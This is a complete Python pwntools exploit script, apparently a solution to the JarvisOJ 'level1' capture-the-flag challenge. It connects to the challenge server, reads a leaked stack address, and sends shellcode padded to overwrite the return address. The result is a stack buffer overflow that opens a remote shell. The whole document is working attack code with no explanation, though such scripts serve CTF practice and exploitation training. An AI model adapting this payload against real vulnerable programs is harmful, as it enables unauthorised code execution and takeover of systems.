#! /usr/bin/python

from pwn import *

p = remote('pwn2.jarvisoj.com',9877)
#p = process('./level1')

p.recvuntil("What's this:")

shellcode = asm(shellcraft.sh())
buf = int(p.recv(10),16)
offset = 0x88 + 0x4

payload = shellcode
payload = payload.ljust(offset,'A')
payload = payload + p32(buf)

p.sendline(payload)
p.interactive()
